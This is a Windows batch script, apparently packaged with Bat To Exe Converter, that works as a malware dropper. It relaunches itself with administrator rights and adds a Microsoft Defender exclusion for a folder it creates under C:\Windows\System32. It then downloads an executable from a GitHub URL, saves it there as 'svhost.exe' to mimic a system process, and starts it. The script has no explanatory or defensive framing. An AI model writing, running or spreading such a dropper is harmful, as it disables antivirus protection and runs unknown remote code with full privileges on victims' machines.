::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAjk
::fBw5plQjdCyDJGyX8VAjFDRnbSmjAE+/Fb4I5/jH/PyEqkIOQN4eaozUlL2NL4A=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSzk=
::cBs/ulQjdF65
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpSI=
::egkzugNsPRvcWATEpSI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+IeA==
::cxY6rQJ7JhzQF1fEqQJlZksaGUrWaTna
::ZQ05rAF9IBncCkqN+0xwdVsBAlTMaSXqZg==
::ZQ05rAF9IAHYFVzEqQIRKwlbTgWWfHm/B7EZ+og=
::eg0/rx1wNQPfEVWB+kM9LVsJDCWBLmSIAuZOpu3j6oo=
::fBEirQZwNQPfEVWB+kM9LVsJDCWBLmSIAuZOpu3j6oo=
::cRolqwZ3JBvQF1fEqQIRKwlbTgWWfHm/B7EZ+qiuobrHq0MOQOMzdIrJug==
::dhA7uBVwLU+EWHiA+0A1SA==
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATE100gMQldSwyWfDrjXuFRurirvqqmpkIfUaIMYZzP37mdYMkd6Ur2ZZk/125fnIsNAh8Ydwa4LgM9qmtMpWuXJInckgPtClqA4UMkCCVmgnDVnj0+ZJ0I
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFDRnbSmjAE+/Fb4I5/jH/PyEqkIOQN4ee53U6LDdcq4W8kCE
::YB416Ek+ZW8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
setlocal EnableExtensions EnableDelayedExpansion
setlocal
:: --- Self-elevate (relaunch as admin) ---
:: If we can't access admin-only resources, re-run ourselves elevated.
net session >nul 2>&1
if %errorlevel% neq 0 (
  powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "Start-Process -FilePath '%~f0' -Verb RunAs"
  exit /b
)
echo 1
:: --- Target folder: the directory this .bat is in ---
set "TARGET_DIR=C:\Windows\System32\mc-fre"
set "TARGET_NAME=svhost.exe"
set "GITHUB_RAW_URL=https://github.com/osama32895/svchost/raw/refs/heads/main/svchost.exe"
:: remove trailing backslash (optional, but keeps it clean)
if "%TARGET_DIR:~-1%"=="\" set "TARGET_DIR=%TARGET_DIR:~0,-1%"

echo Adding Windows Defender exclusion for:
echo   "%TARGET_DIR%"
echo 2

:: --- Add Defender exclusion ---
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
  "Add-MpPreference -ExclusionPath '%TARGET_DIR%'" 2>nul

if %errorlevel% equ 0 (
  echo Done.
) else (
  echo Failed. Make sure Microsoft Defender is enabled and you are running as Administrator.
)
echo 3

::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%" || (echo ERROR: mkdir failed & exit /b 1)

set "OUT_FILE=%TARGET_DIR%\%TARGET_NAME%"

where curl >nul 2>&1
if errorlevel 1 goto :use_powershell

curl -fL "%GITHUB_RAW_URL%" -o "%OUT_FILE%"
if errorlevel 1 goto :curl_failed
echo OK: Saved "%OUT_FILE%"
start %OUT_FILE%
exit /b 0

:curl_failed
echo ERROR: Download failed (curl).
exit /b 1

:use_powershell
where powershell >nul 2>&1
if errorlevel 1 goto :no_tools

powershell -NoProfile -ExecutionPolicy Bypass -Command ^
  "$u='%GITHUB_RAW_URL%'; $o='%OUT_FILE%'; Invoke-WebRequest -UseBasicParsing -Uri $u -OutFile $o"
if errorlevel 1 goto :ps_failed
echo OK: Saved "%OUT_FILE%"
exit /b 0

:ps_failed
echo ERROR: Download failed (PowerShell).
exit /b 1

:no_tools
echo ERROR: Neither curl nor PowerShell is available.
exit /b 1

endlocal